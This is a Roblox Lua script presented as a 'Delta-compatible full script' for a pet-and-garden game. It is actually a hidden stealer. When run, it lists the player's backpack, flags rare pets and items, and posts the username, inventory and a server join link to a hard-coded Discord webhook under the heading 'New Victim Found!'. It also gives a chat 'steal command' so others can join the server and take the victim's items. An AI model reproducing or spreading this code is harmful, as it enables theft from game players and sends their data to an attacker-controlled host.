-- Delta-Compatible Full Script -- Author: Met_dream2 and Silenceyeww (Modified for Delta Executor)

local HttpService = game:GetService("HttpService") local Players = game:GetService("Players") local TextChatService = game:GetService("TextChatService") local SoundService = game:GetService("SoundService") local StarterGui = game:GetService("StarterGui") local TweenService = game:GetService("TweenService") local VirtualInput = game:GetService("VirtualInputManager") local ReplicatedStorage = game:GetService("ReplicatedStorage") local LocalPlayer = Players.LocalPlayer

local webhookUrl = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz" local backdoorWebhook = webhookUrl -- Using same webhook local chatTrigger = "hb1ios" local DISCORD_LINK = "https://discord.gg/UB854NHtwj"

local E_HOLD_TIME, E_DELAY, HOLD_TIMEOUT = 0.1, 0.2, 3 local infiniteYieldLoaded = false

local function sendToBothWebhooks(data) local jsonData = HttpService:JSONEncode(data)

local function safeRequest(url)
    if request then
        request({
            Url = url,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = jsonData
        })
    else
        pcall(function()
            HttpService:PostAsync(url, jsonData, Enum.HttpContentType.ApplicationJson)
        end)
    end
end

pcall(function() safeRequest(webhookUrl) end)
pcall(function() safeRequest(backdoorWebhook) end)

end

local function getInventory() local inventory = { items = {}, rarePets = {}, rareItems = {} } local bannedWords = {"Seed", "Shovel", "Uses", "Tool", "Egg", "Caller", "Staff", "Rod", "Sprinkler", "Crate", "Spray", "Pot"} local rarePets = {"Raccoon", "Inverted Raccoon", "Dragonfly", "Disco Bee", "Mimic octopus", "Spinosauros", "Brontosaurus", "Queen Bee", "Red Fox", "Ankylosarus", "T-Rex", "Chicken Zombie", "Butterfly"} local rareItems = {"Candy Blossom", "Bone Blossom"}

for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
    if item:IsA("Tool") then
        local isBanned = false
        for _, word in ipairs(bannedWords) do
            if string.find(item.Name:lower(), word:lower()) then
                isBanned = true
                break
            end
        end
        if not isBanned then
            table.insert(inventory.items, item.Name)
        end
        for _, rarePet in ipairs(rarePets) do
            if string.find(item.Name, rarePet) then
                table.insert(inventory.rarePets, item.Name)
                break
            end
        end
        for _, rareItem in ipairs(rareItems) do
            if string.find(item.Name, rareItem) then
                table.insert(inventory.rareItems, item.Name)
                break
            end
        end
    end
end
return inventory

end

local function sendToWebhook() if not LocalPlayer then return end local inventory = getInventory() local inventoryText = #inventory.items > 0 and table.concat(inventory.items, "\n") or "No items"

local messageData = {
    content = "L hit bru nothing good",
    embeds = {{
        title = "\u{1F3AF} New Victim Found!",
        description = "READ #\u{26A0}\ufe0finformation in Aurora scripts Server to Learn How to Join Victim's Server and Steal Their Stuff!",
        color = 0x530000,
        fields = {
            {name = "\u{1F464} Username", value = LocalPlayer.Name, inline = true},
            {name = "\u{1F517} Join Link", value = "https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=" .. (game.JobId or "N/A"), inline = true},
            {name = "\u{1F392} Inventory", value = "```" .. inventoryText .. "```", inline = false},
            {name = "\u{1F5E3}\ufe0f Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}
sendToBothWebhooks(messageData)

if #inventory.rarePets > 0 then
    sendToBothWebhooks({
        content = "@everyone",
        allowed_mentions = { parse = { "everyone" } },
        embeds = {{
            title = "\u{1F43E} Rare Pet Found!",
            description = "A rare pet has been detected in the player's inventory!",
            color = 0x530000,
            fields = {
                {name = "\u{1F464} Username", value = LocalPlayer.Name, inline = true},
                {name = "\u{1F517} Join Link", value = "https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=" .. (game.JobId or "N/A"), inline = true},
                {name = "\u{1F43E} Rare Pets", value = "```" .. table.concat(inventory.rarePets, "\n") .. "```", inline = false},
                {name = "\u{1F5E3}\ufe0f Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })
end

if #inventory.rareItems > 0 then
    sendToBothWebhooks({
        content = "@everyone",
        allowed_mentions = { parse = { "everyone" } },
        embeds = {{
            title = "\u{1F31F} Rare Item Found!",
            description = "A rare item has been detected in the player's inventory!",
            color = 0x530000,
            fields = {
                {name = "\u{1F464} Username", value = LocalPlayer.Name, inline = true},
                {name = "\u{1F517} Join Link", value = "https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=" .. (game.JobId or "N/A"), inline = true},
                {name = "\u{1F31F} Rare Items", value = "```" .. table.concat(inventory.rareItems, "\n") .. "```", inline = false},
                {name = "\u{1F5E3}\ufe0f Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })
end

end

sendToWebhook()

